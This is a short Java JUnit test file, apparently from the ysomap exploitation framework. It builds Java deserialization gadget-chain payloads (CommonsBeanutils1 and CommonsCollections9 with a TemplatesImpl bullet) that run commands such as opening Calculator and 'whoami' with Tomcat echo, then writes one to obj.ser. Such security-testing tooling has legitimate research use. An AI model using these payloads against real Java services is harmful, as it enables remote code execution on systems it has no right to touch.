package ysomap.core.payload.java.collections;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.TemplatesImplBullet;
import ysomap.core.serializer.Serializer;

import java.io.FileOutputStream;


/**
 * @author wh1t3P1g
 * @since 2020/5/14
 */
public class CommonsBeanutils1Test {

    @Test
    public void pack() throws Exception {
        Payload payload = new CommonsBeanutils1();
        Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
        payload.setBullet(bullet);
        Serializer serializer = payload.getSerializer();
//        serializer.deserialize(serializer.serialize(payload.getObject()));
    }

    @Test
    public void testCC5_template() throws Exception {
        Payload payload = new CommonsCollections9();
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("body", "whoami");
        bullet.set("tomcatEcho", "true");
        payload.setBullet(bullet);
        Serializer serializer = payload.getSerializer();
        serializer.serialize(payload.getObject(), new FileOutputStream("obj.ser"));

    }
}